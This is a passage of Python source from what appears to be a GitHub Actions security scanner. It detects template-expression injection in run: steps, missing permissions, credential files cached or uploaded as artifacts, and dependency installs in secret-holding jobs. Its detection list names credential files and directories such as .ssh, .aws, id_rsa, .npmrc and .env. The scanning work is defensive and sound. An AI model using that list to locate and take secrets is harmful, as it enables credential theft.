                # is recorded as a coverage gap. Once per file: after the
                # cursor runs past the last raw `run:` token every remaining
                # parsed step lands here, and one honest line beats a hundred.
                if not unanchored_reported:
                    unanchored_reported = True
                    logger.warning(
                        "yaml-run-injection: %s has run: step(s) whose shell "
                        "text could not be anchored to a raw run: line "
                        "(YAML anchor/alias expansion) — those steps were "
                        "NOT scanned for injection sinks; review them "
                        "manually", file_path,
                    )
                    _record_dropped_match(
                        file_path,
                        "a run: step's shell text could not be anchored to a "
                        "raw run: line (YAML anchor/alias expansion yields "
                        "more parsed steps than the file has run: tokens) — "
                        "it was NOT scanned for injection sinks; review the "
                        "step manually",
                    )
                continue
            file_cursor = run_anchor.end()
            search_cursor = file_cursor
            for m in compiled.finditer(run_text):
                snippet = m.group(0)
                if _is_shape_safe_expression(snippet):
                    logger.debug(
                        "yaml-run-injection: %s in %s is a GitHub-generated "
                        "value-shape-safe field — not an injection sink",
                        snippet, file_path,
                    )
                    continue
                idx = text.find(snippet, search_cursor)
                if idx < 0:
                    # The match exists in the parsed scalar but not
                    # verbatim in the raw file. This happens with YAML
                    # folded scalars (``run: >``), where PyYAML
                    # collapses linebreaks into spaces, so a snippet
                    # spanning a fold becomes unfindable. Safe for
                    # today's P14.10 sub-patterns — each is a single-
                    # line ``${{ ... }}`` expression that survives
                    # folding identically — but a future multi-token
                    # pattern would be dropped here. Warn (not debug) so
                    # the drop is visible at the default log level and
                    # explicitly say the match is NOT reported, matching
                    # how the recursion-cap surfaces its coverage limit.
                    logger.warning(
                        "yaml-run-injection: snippet %r matched the parsed "
                        "run: scalar but not the raw file text (likely a "
                        "folded scalar) in %s — this match is NOT reported; "
                        "verify the step manually",
                        snippet,
                        file_path,
                    )
                    _record_dropped_match(
                        file_path,
                        f"a template expression ({snippet}) matched inside a "
                        "run: step but could not be located in the raw file "
                        "(folded scalar) — it is NOT reported; review the step "
                        "manually",
                    )
                    continue
                search_cursor = idx + 1
                line_no = text[:idx].count("\n") + 1
                lidx = line_no - 1
                start = max(0, lidx - 1)
                stop = min(len(lines), lidx + 2)
                evidence = "\n".join(
                    f"{i + 1:>4}: {lines[i]}"
                    f"{' <-- here' if i == lidx else ''}"
                    for i in range(start, stop)
                )
                # The gate note is a claim the SCANNER assembled, and this
                # detector's evidence is a verbatim excerpt — concatenating
                # them would render scanner prose inside the report's ```yaml
                # source fence. `derived_note` is the channel for exactly
                # this shape (see RawHit).
                #
                # Only the dead-field verdict is carried here. The generic
                # "stands only if that gate can be bypassed" is true of the
                # correlated chains, whose payoff leg IS the untrusted
                # trigger; it is false of an injection, which this catalog
                # entry says is worth fixing even on a trusted trigger. And a
                # step with its own `if:` withdraws the verdict entirely: the
                # finding is the STEP, so a statement about who reaches the
                # JOB would talk past the live control.
                gate = "" if step.get("if") is not None else _gate_note(
                    job, triggers, dead_field_only=True,
                )
                yield RawHit(
                    line=line_no,
                    evidence=evidence,
                    match_text=snippet,
                    derived_note=gate.strip() or None,
                )


def detect_yaml_path_absent(
    file_path: Path, yaml_path: str
) -> Iterator[RawHit]:
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return
    parts = [p for p in yaml_path.split(".") if p]
    matches = list(_walk_yaml_path(doc, parts))
    # `permissions: null` (or the bare `permissions:` spelling) parses
    # to None — GitHub Actions treats that identically to omitting the
    # key, so we must fire. An empty mapping (`permissions: {}`) is
    # the hardened state and must NOT fire. Distinguish by treating
    # all-None resolution as absent.
    if any(m is not None for m in matches):
        return
    yield RawHit(
        line=1,
        evidence=f"(missing) {yaml_path}",
        match_text=yaml_path,
        derived=True,
    )


def affected_jobs_for(file_path: Path) -> list[str]:
    """Return sorted job names from a workflow file.

    Returns an empty list on any of three failure modes (unreadable,
    unparseable, malformed) — each logged separately so a parse error
    doesn't masquerade as "this workflow has no jobs".
    """
    text = _read_text_safe(file_path)
    if not text:
        return []
    doc = _parse_yaml_text(text, file_path)
    if doc is None:
        return []
    if not isinstance(doc, dict):
        logger.debug("Workflow %s did not parse to a mapping", file_path)
        return []
    jobs = doc.get("jobs")
    if jobs is None:
        return []
    if not isinstance(jobs, dict):
        logger.debug("Workflow %s has non-mapping jobs:", file_path)
        return []
    return sorted(str(k) for k in jobs.keys())


def job_line_ranges(file_path: Path) -> list[tuple[str, int, int]] | None:
    """``(job_name, first_line, last_line)`` for every job, in file order.

    ``yaml.safe_load`` throws line numbers away, so this composes the document
    into its node tree — which carries source marks — and reads the marks off
    the ``jobs:`` mapping. A node's end mark usually points at the first token
    of the NEXT job, so each range is clipped to the line before the following
    job starts; otherwise adjacent jobs would overlap and a line could be
    attributed to two of them. The LAST job is clipped at the end of the
    ``jobs:`` node itself, so a workflow-level key written after ``jobs:``
    (``defaults:``, a trailing ``permissions:``) is not swallowed into it.

    Three return values, not two:

    - a list of ranges → attribution worked (``[]`` legitimately means "this
      workflow declares no jobs").
    - ``None`` → the ranges could not be COMPUTED (the document would not
      compose, or its root/``jobs:`` node is not a mapping). Callers must
      render that as an unknown, not as "this line is workflow-scope" — those
      look identical downstream and one of them is a false claim.
    """
    text = _read_text_safe(file_path)
    if not text:
        return None
    try:
        root = yaml.compose(text)
    except yaml.YAMLError:
        return None
    if not isinstance(root, yaml.MappingNode):
        return None
    for key, value in root.value:
        if getattr(key, "value", None) != "jobs":
            continue
        if not isinstance(value, yaml.MappingNode):
            return None
        # The `jobs:` node's own end mark. PyYAML points it at the first token
        # AFTER the mapping, which is either a workflow-level key (so the
        # jobs block really ended the line before) or plain EOF (so that line
        # is still the last job's). Column-0 content is the tell: workflow-
        # level keys are unindented, job bodies never are.
        jobs_end = value.end_mark.line + 1
        _lines = text.splitlines()
        if 1 <= jobs_end <= len(_lines) and _lines[jobs_end - 1][:1].strip():
            jobs_end -= 1
        raw = [
            (str(jk.value), jk.start_mark.line + 1, jv.end_mark.line + 1)
            for jk, jv in value.value
            if hasattr(jk, "value")
        ]
        raw.sort(key=lambda r: r[1])
        clipped: list[tuple[str, int, int]] = []
        for i, (name, start, end) in enumerate(raw):
            if i + 1 < len(raw):
                end = min(end, raw[i + 1][1] - 1)
            else:
                end = min(end, jobs_end)
            clipped.append((name, start, max(start, end)))
        return clipped
    return []


def job_at_line(
    ranges: list[tuple[str, int, int]] | None, line: int
) -> str | None:
    """The job containing ``line``, or None when the line sits outside every
    job (workflow-level keys such as ``on:`` or a workflow-scope
    ``permissions:``) — those findings keep the whole file's job list.

    ``ranges is None`` (attribution uncomputable) also yields None, but the
    caller is expected to have branched on that first: the two Nones mean
    different things and only one of them means "workflow-scope"."""
    for name, start, end in ranges or []:
        if start <= line <= end:
            return name
    return None


def _is_workflow_call_only(file_path: Path) -> bool:
    """True when this workflow's ONLY trigger is ``workflow_call``.

    Such a file is a reusable workflow: it never starts a run of its own, and
    GitHub attributes every run it takes part in to the CALLING workflow. Its
    own ``/actions/workflows/<file>/runs`` endpoint therefore answers 200 with
    ``total_count: 0`` even when the file executes on every pull request — see
    ``fetch_workflow_activity``.
    """
    text = _read_text_safe(file_path)
    if not text:
        return False
    doc = _parse_yaml_text(text, file_path, quiet=True)
    if not isinstance(doc, dict):
        return False
    return set(_on_trigger_names(_get_on_node(doc))) == {"workflow_call"}


def fetch_workflow_activity(
    repo: str, workflow_basename: str, workflow_call_only: bool = False,
) -> dict[str, Any]:
    """Fetch recent-run activity for a workflow via gh CLI.

    On success returns ``{"runs_30d", "last_run", "dormant"}``. On any
    failure returns ``{"status": "unavailable", "reason": ...}`` — NOT an
    empty dict. The distinction matters: ``{}`` means "not enriched" (no
    ``--repo``), whereas an enrichment that was *attempted and failed* must
    not be silently read as "active". A finding whose activity check failed
    would otherwise look identical to an active one (the dormancy flag just
    goes missing), so report.py renders the unavailable state distinctly
    instead of defaulting it to active. Each failure also logs a warning.

    ``workflow_call_only`` marks a REUSABLE workflow (its `on:` declares
    nothing but `workflow_call`). GitHub attributes a reusable workflow's runs
    to the caller, so this endpoint returns 200 with an EMPTY run list for a
    file that executes on every pull request. Reading that as "dormant" was
    wrong in the way that matters: vercel/next.js's `pr_stack_optimizer.yml`
    and microsoft/playwright's `tests_docker.yml` both run constantly, and both
    carried a "verify before prioritizing" note on live HIGH findings — and,
    worse, a dormant group is dropped from the report's `all` fix selection, so
    next.js's only HIGH was silently skipped. Zero REGISTERED runs on a
    reusable workflow is UNKNOWN activity, which is what the `unavailable`
    state already means. A reusable workflow that DOES have registered runs
    keeps its real numbers.
    """
    logger.debug("fetching activity for %s/%s", repo, workflow_basename)
    try:
        from gh_utils import GitHubAPIError, run_gh_api  # noqa: E402
    except ImportError as e:
        logger.warning(
            "gh_utils unavailable; skipping activity enrichment: %s", e
        )
        return {"status": "unavailable", "reason": "gh_utils unavailable"}

    endpoint = (
        f"repos/{repo}/actions/workflows/{workflow_basename}/runs"
        f"?per_page={ACTIVITY_RUN_LIMIT}"
    )
    try:
        raw = run_gh_api(endpoint, quiet_not_found=True)
    except GitHubAPIError as e:
        # A 404 here is expected, not a failure: the scanner walks every
        # `.github/workflows/*.yml`, but GitHub only tracks run history for
        # files it registers as runnable workflows. A composite-action
        # `action.yml`, or a workflow never registered on the default branch,
        # returns 404 from the runs endpoint — there is simply no activity to
        # enrich. Log that at DEBUG; reserve WARNING for genuine failures
        # (auth, rate limit, network). Either way activity is reported as
        # unavailable, never silently assumed active.
        is_not_found = "HTTP 404" in str(e) or "Not Found" in str(e)
        (logger.debug if is_not_found else logger.warning)(
            "gh API %s for %s/%s activity: %s",
            "404 — no tracked workflow runs" if is_not_found else "failed",
            repo, workflow_basename, e,
        )
        return {"status": "unavailable", "reason": f"gh API error: {e}"}

    try:
        body = json.loads(raw)
    except json.JSONDecodeError as e:
        logger.warning(
            "gh returned non-JSON for %s/%s activity: %s",
            repo,
            workflow_basename,
            e,
        )
        return {"status": "unavailable", "reason": "gh returned non-JSON"}

    runs = body.get("workflow_runs") or []
    if workflow_call_only and not runs:
        # Not dormant — unknown. See the docstring: GitHub books a reusable
        # workflow's runs against the caller, so an empty list here is an
        # artefact of run attribution, not evidence that the file is idle.
        logger.debug(
            "%s/%s is `workflow_call`-only with no registered runs — activity "
            "unknown (runs are attributed to the calling workflow)",
            repo, workflow_basename,
        )
        return {
            "status": "unavailable",
            "reusable_workflow": True,
            "reason": (
                "reusable workflow (`on: workflow_call` only) — GitHub "
                "attributes its runs to the calling workflow, so its own run "
                "history is empty whether or not it executes"
            ),
        }
    now = _dt.datetime.now(_dt.timezone.utc)
    cutoff_30d = now - _dt.timedelta(days=30)
    cutoff_dormant = now - _dt.timedelta(days=DORMANT_DAYS)

    runs_30d = 0
    last_run: str | None = None
    last_run_dt: _dt.datetime | None = None
    skipped_runs = 0
    for run in runs:
        created = run.get("created_at")
        if not created:
            skipped_runs += 1
            continue
        try:
            created_dt = _dt.datetime.fromisoformat(created.replace("Z", "+00:00"))
        except ValueError:
            skipped_runs += 1
            continue
        if last_run_dt is None or created_dt > last_run_dt:
            last_run_dt = created_dt
            last_run = created
        if created_dt >= cutoff_30d:
            runs_30d += 1

    if skipped_runs:
        logger.warning(
            "Skipped %d runs with missing/unparseable created_at for %s/%s",
            skipped_runs,
            repo,
            workflow_basename,
        )

    dormant = last_run_dt is None or last_run_dt < cutoff_dormant
    activity = {
        "runs_30d": runs_30d,
        "last_run": last_run,
        "dormant": dormant,
    }
    logger.debug(
        "  activity: %s runs, last %s",
        activity.get("runs_30d"), activity.get("last_run"),
    )
    return activity


def _git_commit_sha(root: Path) -> str | None:
    """Return the HEAD SHA of the git repo containing ``root``, or None."""
    try:
        result = subprocess.run(
            ["git", "-C", str(root), "rev-parse", "HEAD"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode == 0:
            sha = result.stdout.strip()
            return sha if sha else None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return None


def _skill_commit_sha() -> str | None:
    """Return the HEAD SHA of the git repo containing this script.

    Used to build content-addressable permalinks into the catalog so
    reports never go stale when headings or files are renamed.
    """
    return _git_commit_sha(_THIS_DIR)


def _skill_tree_dirty() -> bool:
    """True if the skill's tracked source has uncommitted changes vs HEAD.

    ``_skill_commit_sha()`` returns the committed HEAD, which silently ignores
    edits sitting in the working tree — so a report can record an older commit
    than the code that actually produced it (this exact gap once made a report
    claim a stale commit and derailed a review). Flagging a dirty tree keeps
    the recorded ``skill commit`` honest. The ``reports/`` output dir is
    excluded: the e2e harness writes generated reports into it, which is not a
    change to the code that ran.
    """
    skill_dir = _THIS_DIR.parent  # skills/ci-secure/
    try:
        result = subprocess.run(
            ["git", "-C", str(skill_dir), "status", "--porcelain", "--", "."],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode != 0:
            return False
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False
    for raw in result.stdout.splitlines():
        path = raw[3:].strip()  # porcelain v1: "XY <path>", relative to skill_dir
        if " -> " in path:  # rename: take the destination
            path = path.split(" -> ", 1)[1]
        path = path.strip('"')  # git quotes paths with spaces/special chars
        if not path or path.startswith("reports/"):
            continue
        return True
    return False


def _repo_tree_dirty(root: Path) -> bool:
    """True if the AUDITED checkout has uncommitted or untracked changes.

    ``commit_sha`` records HEAD, which says nothing about edits sitting in the
    working tree — so a report can present a permalink at a commit whose bytes
    are not the bytes that were scanned. report.py renders a "tree was dirty"
    caveat on the audited-commit row when this is true (the convention ci-score
    already uses). Unknown (git missing, not a checkout) reports not-dirty:
    the commit row itself already says when no commit could be resolved.
    """
    try:
        result = subprocess.run(
            ["git", "-C", str(root), "status", "--porcelain"],
            capture_output=True, text=True, timeout=10,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False
    if result.returncode != 0:
        return False
    return bool(result.stdout.strip())


def _path_matches_any_glob(rel_path: str, globs: list[str]) -> bool:
    for g in globs:
        if fnmatch.fnmatch(rel_path, g):
            return True
    return False


# =============================================================================
# yaml-job-correlated, yaml-workflow-correlated, repo-file-check
# =============================================================================
#
# Each pattern using these detector classes names a built-in
# "correlation" or "file_check" identifier in its METADATA. The
# identifier maps to a Python function below. Keeps METADATA short
# (one key) while letting the catalog opt into specific predicates
# without growing a DSL.


def _job_step_uses_prefixes(job: dict[str, Any], prefixes: tuple[str, ...]) -> list[int]:
    """Return 1-based step indices whose `uses:` starts with any prefix."""
    hits: list[int] = []
    steps = job.get("steps")
    if not isinstance(steps, list):
        return hits
    for i, step in enumerate(steps, start=1):
        if not isinstance(step, dict):
            continue
        uses = step.get("uses", "")
        if isinstance(uses, str) and any(uses.startswith(p) for p in prefixes):
            hits.append(i)
    return hits


def _job_uses_cache(job: dict[str, Any]) -> bool:
    """Return True when the job restores or writes the shared cache.

    Covers `actions/cache@*`, `actions/cache/restore@*`, `actions/cache/save@*`,
    `actions/setup-{node,python,go,java,ruby,dotnet}` with `cache:` input,
    `pnpm/action-setup`, and `gradle/actions/setup-gradle`.
    """
    if _job_step_uses_prefixes(
        job,
        ("actions/cache@", "actions/cache/", "pnpm/action-setup", "gradle/actions/setup-gradle"),
    ):
        return True
    steps = job.get("steps")
    if not isinstance(steps, list):
        return False
    for step in steps:
        if not isinstance(step, dict):
            continue
        uses = step.get("uses", "")
        if not isinstance(uses, str):
            continue
        if any(
            uses.startswith(p)
            for p in (
                "actions/setup-node@",
                "actions/setup-python@",
                "actions/setup-go@",
                "actions/setup-java@",
                "actions/setup-ruby@",
                "actions/setup-dotnet@",
            )
        ):
            with_block = step.get("with") or {}
            if isinstance(with_block, dict) and with_block.get("cache"):
                return True
    return False


def _walk_jobs(doc: Any) -> Iterator[tuple[str, dict[str, Any]]]:
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return
    for job_name, job in jobs.items():
        if isinstance(job, dict):
            yield str(job_name), job


def _job_line_in_text(text: str, job_name: str) -> int:
    """Best-effort line number for `<job_name>:` under the top-level `jobs:`.

    The indent class is `[ \\t]`, NOT `\\s`. Under `re.MULTILINE`, `\\s` matches
    a newline, so `^\\s+` could start at a BLANK line and run through the line
    break into the next line's indentation — and `m.start()` then reported the
    blank line above the job key. On cal.com's `pr.yml` that landed the
    reported line inside the PRECEDING job's block, so a P14.19 finding cited
    `jobs.trust-check` at line 160 while its own evidence named `jobs.prepare`.
    A horizontal-only indent class cannot cross a line boundary, so the match
    always starts on the job key's own line.
    """
    pattern = re.compile(rf"^[ \t]+{re.escape(job_name)}\s*:", re.MULTILINE)
    m = pattern.search(text)
    if not m:
        return 1
    return text.count("\n", 0, m.start()) + 1


_CREDENTIAL_DIR_COMPONENTS = {
    ".aws", ".ssh", ".kube", ".docker", ".gnupg", ".azure", ".gcloud",
}
_CREDENTIAL_BASENAMES = {
    ".npmrc", ".netrc", ".pypirc", "credentials", "credentials.json", ".env",
}
_CREDENTIAL_BASENAME_GLOBS = (
    "*.pem", "*.key", "id_rsa", "id_rsa*", "id_ed25519", "id_ed25519*",
    "service-account*.json", "*.p12", "*.pfx",
)
_CACHE_UPLOAD_PREFIXES = (
    "actions/cache@", "actions/cache/save@", "actions/cache/restore@",
    "actions/upload-artifact@", "actions/upload-pages-artifact@",
)


def _path_is_credential_bearing(path_line: str) -> bool:
    p = path_line.strip().strip('"').strip("'")
    if not p:
        return False
    components = [c for c in re.split(r"[\\/]+", p) if c not in ("", "~", ".")]
    if not components:
        return False
    if any(c.lower() in _CREDENTIAL_DIR_COMPONENTS for c in components):
        return True
    base = components[-1].lower()
    if base in _CREDENTIAL_BASENAMES:
        return True
    return any(fnmatch.fnmatch(base, g) for g in _CREDENTIAL_BASENAME_GLOBS)


def _correlation_credential_file_in_cache_or_artifact(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.19 — a cache or upload step's `path:` matches a known credential
    file/dir, exfiltrating it to cache-restorers / artifact-downloaders."""
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    for job_name, job in _walk_jobs(doc):
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            uses = step.get("uses", "")
            if not isinstance(uses, str) or not any(
                uses.startswith(p) for p in _CACHE_UPLOAD_PREFIXES
            ):
                continue
            with_block = step.get("with") or {}
            if not isinstance(with_block, dict):
                continue
            raw_path = with_block.get("path")
            if not isinstance(raw_path, str):
                continue
            hit_line = next(
                (
                    pl.strip() for pl in raw_path.splitlines()
                    if _path_is_credential_bearing(pl)
                ),
                None,
            )
            if hit_line is not None:
                line = _job_line_in_text(text, job_name)
                yield RawHit(
                    line=line,
                    evidence=(
                        f"{line:>4}: jobs.{job_name} caches/uploads "
                        f"credential-bearing path `{hit_line}` <-- here"
                    ),
                    match_text=hit_line,
                    derived=True,
                )



# --- P14.25: install scripts executed in a job that holds a live payoff -------
#
# Conditioned like the other chain detectors, NOT like a hygiene check: an
# install command on its own is every repo's CI and flagging it would be noise.
# The finding is the PAIRING — dependency lifecycle scripts executing where the
# credentials are.

# `npm ci`, `npm install`, `npm i`, `pnpm install`, `pnpm i`, `yarn install`,
# and a bare `yarn` (Yarn Classic installs when called with no command). Bounded
# on both sides so `mynpm install` or `yarn build` never match.
#
# The bare-Yarn arm accepts OPTIONS after `yarn`, because that is how it is
# actually written in CI — `yarn --frozen-lockfile`, `yarn --production`,
# `yarn --cwd packages/app`, `yarn --network-timeout 600000` are all installs,
# and an arm that only accepted a bare `yarn` at end-of-command silently
# passed over every one of them. An option's separate VALUE is consumed with
# it (`--cwd subdir`), quoted or not (`--cwd "packages/app with spaces"`),
# which is what stops the match dying on the space.
# A trailing SUBCOMMAND still ends the match — `yarn build` and
# `yarn --cwd subdir build` are not installs, because after the options the
# arm requires end-of-command, not another word — and the leading negative
# lookahead drops the informational invocations (`yarn -v`, `yarn -V`,
# `yarn --version`, `yarn --help`), which run no lifecycle scripts.
#
# EVERY arm is additionally anchored in COMMAND POSITION — the manager name has
# to be the word the shell would actually execute, never a word sitting inside
# an argument. The old left boundary was a `(?<![\w./-])` lookbehind, which
# excludes `mynpm` but says nothing about `,` or `=`, so vitejs/vite's
# `pnpm dlx pkg-pr-new@0.0 publish … --packageManager=pnpm,npm,yarn
# --commentWithDev` matched the bare-Yarn arm on the `yarn` in that
# comma-separated flag VALUE. It matched as `yarn --commentWithDev`, the job's
# manager was read as Yarn, and the cascade from there was total: the repo's
# real pnpm `allowBuilds` mitigation no longer applied (manager mismatch), a
# Yarn advisory rendered on a repo with no Yarn in it, and the fix prompt
# prescribed destructive Yarn edits to a release workflow. `,` and `=` are only
# two of the characters that can precede a word inside an argument, so the fix
# is positional rather than another blacklist: a command starts at the start of
# the string/line or right after `;`, `&`, `|`, or `(` — nowhere else.
# The one non-shell opener that still puts a command in command position: this
# matcher is run over RAW workflow lines as well as over parsed scalars, and on
# a one-line step (`- run: npm ci`) the shell starts right after the `run:` key.
_RUN_KEY_PREFIX = r"""[ \t]*(?:-[ \t]+)?["']?run["']?[ \t]*:[ \t]*"""
# `)` closes a `case` arm's pattern (`a) npm ci ;;`) and a subshell; `{` opens a
# brace group, which shell requires be followed by whitespace (`{ npm ci; }`) —
# demanding that space is also what keeps brace EXPANSION (`{npm,pnpm}`) out.
_CMD_START = (
    r"(?:^(?:" + _RUN_KEY_PREFIX + r")?[ \t]*"
    r"|(?<=[\n;&|()])[ \t]*"
    r"|(?<=\{)[ \t]+)"
)
# …with the words that can legally precede a command WITHOUT being it: shell
# keywords, the usual command-modifier wrappers, and leading `VAR=value`
# assignments. Without this allowance `sudo npm ci`, `env CI=1 pnpm install`
# and `; then yarn install` would each become a silent false negative, which is
# the worse failure for this detector (see `_INSTALL_VALUE_FLAGS`).
#
# The list is deliberately CLOSED, and is spelled as data rather than inlined
# into the regex so that closedness is ASSERTABLE. Written as a bare
# alternation nothing pinned it: `echo` could be added and the whole suite
# still passed, because the negative cases all put their install several words
# from the head. `test_the_command_wrapper_list_is_closed` pins this exact set.
#
# Membership rule: a word belongs here only if it is a TRANSPARENT process
# wrapper — it execs the following command in the SAME shell environment, with
# the same filesystem and the same secrets. That is the property P14.25's
# payoff leg rests on, and it is why `docker exec` / `docker run` are absent:
# the install runs in a container, not in the job that holds the secrets.
_CMD_WRAPPERS = (
    # shell keywords and the negation operator
    "!", "if", "while", "until", "then", "else", "do",
    # transparent command modifiers / process wrappers
    "sudo", "command", "time", "nice", "ionice", "exec", "env",
    "xvfb-run", "nohup", "setsid", "stdbuf", "timeout", "retry",
)
_CMD_PREFIX = (
    r"(?:"
    r"(?:" + "|".join(re.escape(w) for w in _CMD_WRAPPERS) + r")"
    # A wrapper option may carry its own VALUE (`sudo -u root`, `nice -n 10`).
    # The value is optional and cannot start with `-`, so `sudo -E npm ci`
    # backtracks out of it rather than eating the manager.
    r"(?:[ \t]+-{1,2}[\w-]*(?:[ \t]+[^-\s;&|][^\s;&|]*)?)*"
    # …and a bare NUMERIC argument, for the wrappers whose first operand is a
    # duration or a count: `timeout 60 npm ci`, `retry 3 pnpm install`.
    r"(?:[ \t]+\d[\w.]*)?[ \t]+"
    r"|(?:export[ \t]+)?[A-Za-z_][A-Za-z0-9_]*="
    r"(?:\"[^\"]*\"|'[^']*'|[^\s;&|]*)[ \t]+"
    r")*"
)
_INSTALL_CMD_RE = re.compile(
    _CMD_START + _CMD_PREFIX +
    r"(?<![\w./-])(?P<cmd>"
    r"npm\s+(?:ci|install|i)(?![\w-])"
    r"|pnpm\s+(?:install|i)(?![\w-])"
    r"|yarn\s+install(?![\w-])"
    r"|yarn(?!\s+-{0,2}(?:version|help|[vV]|h)(?![\w-]))"
    r"(?:\s+-[\w-]+(?:[= ](?:\"[^\"]*\"|'[^']*'|[^\s;&|]+))?)*\s*(?:$|[\n;&|])"
    r")",
    re.MULTILINE,
)
_IGNORE_SCRIPTS_RE = re.compile(r"--ignore-scripts(?![\w-])")

# --- what makes an install a DEPENDENCY-TREE install --------------------------
#
# The catalog's anti-pattern is a compromised package *in the dependency tree*
# executing its lifecycle script during a bulk install. Two command shapes match
# the regex above without being that:
#
#   npm i -g corepack@0.31          # global tool bootstrap — no project tree
#   npm install @playwright/test    # one named package, chosen by the author
#
# A global install resolves nothing from the repo's lockfile; a named install
# installs exactly what the workflow author typed. Neither is "whatever the tree
# resolves to today". Both are EXCLUDED — not silently widened into a different
# finding: a named single-package install whose own lifecycle script is
# malicious is a real but DIFFERENT shape (it needs the package's identity and
# a registry check, not a tree argument), and this detector does not claim it.
# vercel/next.js alone reported seventeen `npm i -g corepack@0.31` bootstraps
# and playwright four more named installs before this gate existed.
_GLOBAL_FLAGS = {"-g", "--global"}
# Options that consume the NEXT token as their value. Without this list
# `pnpm install --filter foo` would read `foo` as a package spec and the real
# tree install would be dropped — a false negative worse than the noise.
_INSTALL_VALUE_FLAGS = {
    "-C", "--cwd", "--dir", "--prefix", "--filter", "-F", "--filter-prod",
    "--registry", "--network-timeout", "--network-concurrency",
    "--cache-folder", "--modules-folder", "--mutex", "--store-dir",
    "--modules-dir", "--lockfile-dir", "--virtual-store-dir", "--reporter",
    "--loglevel", "--config", "--userconfig", "--cache", "--workspace",
    "--use-yarnrc", "--resolution-mode", "--package-import-method",
    "--node-linker", "--public-hoist-pattern", "--omit", "--include",
}
# Options that take NO value. This list exists so the UNKNOWN case can default
# the safe way round: an option we have never heard of is assumed to consume
# its value, because the alternative leaves that value sitting as a bare
# positional, `_PKG_SPEC_RE` reads it as a package name, and the whole
# tree-install finding vanishes SILENTLY (no `dropped_matches`, no coverage
# gap). Ten such shapes were proven — `npm ci --maxsockets 3`,
# `pnpm install --fetch-timeout 60000`, `npm ci --before 2024-01-01` — each an
# un-reported privileged install. The failure mode of a closed value-flag list
# is "an option nobody thought of", and it grows with every package-manager
# release; the failure mode of this default is one extra finding on a named
# install written with an unfamiliar boolean flag. This file's own rule (see
# `_INSTALL_VALUE_FLAGS`) is that the false negative is the worse one.
_INSTALL_BOOLEAN_FLAGS = {
    # npm
    "--save", "-S", "--save-dev", "-D", "--save-prod", "-P", "--save-optional",
    "-O", "--save-exact", "-E", "--save-peer", "--no-save", "--production",
    "--legacy-peer-deps", "--force", "-f", "--ignore-scripts", "--no-audit",
    "--no-fund", "--dry-run", "--global-style", "--package-lock-only",
    "--prefer-offline", "--prefer-online", "--offline", "--audit", "--fund",
    "--strict-peer-deps", "--install-links", "--foreground-scripts",
    "--verbose", "--silent", "--quiet", "--json", "--long", "--parseable",
    "--no-package-lock", "--no-bin-links",
    # pnpm
    "--frozen-lockfile", "--no-frozen-lockfile", "--prod", "--dev",
    "--shamefully-hoist", "--lockfile-only", "--fix-lockfile", "--recursive",
    "-r", "-w", "--workspace-root", "--no-optional", "--ignore-workspace",
    "--strict-peer-dependencies", "--no-strict-peer-dependencies",
    "--side-effects-cache", "--no-verify-store-integrity",
    # yarn
    "--immutable", "--frozen-lockfile", "--ignore-optional",
    "--ignore-engines", "--check-files", "--non-interactive", "--pure-lockfile",
    "--no-lockfile", "--immutable-cache", "--inline-builds", "--ignore-platform",
}
# A positional argument shaped like something you can install: a bare or scoped
# package name with an optional version/tag, or a URL/git/file/github specifier.
_PKG_SPEC_RE = re.compile(
    r"^(?:(?:git\+|https?://|file:|link:|github:|npm:|workspace:).+"
    r"|(?:@[A-Za-z0-9._-]+/)?[A-Za-z0-9._-]+(?:@[^\s]+)?)$"
)
_INSTALL_SUBCOMMANDS = {"install", "i", "ci"}


def _install_manager(command: str) -> str | None:
    """Which package manager the install command in `command` invokes."""
    m = _INSTALL_CMD_RE.search(command)
    if m is None:
        return None
    # `cmd`, not `group(0)`: the match now opens with the command-position
    # anchor and any `sudo` / `VAR=value` prefix, and reading the manager off
    # that prefix would name the wrong tool.
    head = m.group("cmd").lstrip()
    for name in ("npm", "pnpm", "yarn"):
        if head.startswith(name):
            return name
    return None      # pragma: no cover - the regex has only three arms


def _is_dependency_tree_install(segment: str) -> bool:
    """Is the install matched in `segment` a DEPENDENCY-TREE install?

    False for a global install (`-g` / `--global`) and for one that names an
    explicit package spec — see the block comment above. True for the bare
    tree installs the catalog is about: `npm ci`, `npm install`,
    `pnpm install --frozen-lockfile`, `yarn install`, `yarn --cwd packages/app`.
    """
    m = _INSTALL_CMD_RE.search(segment)
    if m is None:
        return False
    # Slice at the COMMAND, not at the whole match: the match now includes the
    # command-position anchor and any prefix, and `tokens[0]` must be the
    # package manager for the flag walk below to line up.
    tail = segment[m.start("cmd"):]
    try:
        tokens = shlex.split(tail, comments=False)
    except ValueError:
        # Unbalanced quotes across a fragment boundary — fall back to a plain
        # split rather than dropping the command entirely.
        tokens = tail.split()
    if not tokens:
        return False
    tokens = tokens[1:]                                   # the manager itself
    subcommand = None
    if tokens and tokens[0] in _INSTALL_SUBCOMMANDS:
        subcommand = tokens[0]
        tokens = tokens[1:]                               # ci / install / i
    # Two shapes where a POSITIONAL cannot mean "one named package", so the
    # named-install exclusion must not fire on it:
    #   `npm ci foo`   — `ci` installs the whole lockfile whatever follows it;
    #   `pnpm install ${{ inputs.args }}` — the arguments are not knowable at
    #                    scan time, and guessing them into an exclusion is a
    #                    silent drop. Only an explicit `-g` still excludes.
    positionals_can_exclude = subcommand != "ci" and "${{" not in tail
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok in _GLOBAL_FLAGS:
            return False
        if tok.startswith("-"):
            if "=" in tok or tok in _INSTALL_BOOLEAN_FLAGS:
                i += 1
                continue
            # Known value-taking, or unknown — either way assume it consumes
            # the next token, unless that token is itself an option. See
            # `_INSTALL_BOOLEAN_FLAGS` for why unknown defaults this way.
            if i + 1 < len(tokens) and not tokens[i + 1].startswith("-"):
                i += 2
                continue
            i += 1
            continue
        if positionals_can_exclude and _PKG_SPEC_RE.match(tok):
            return False
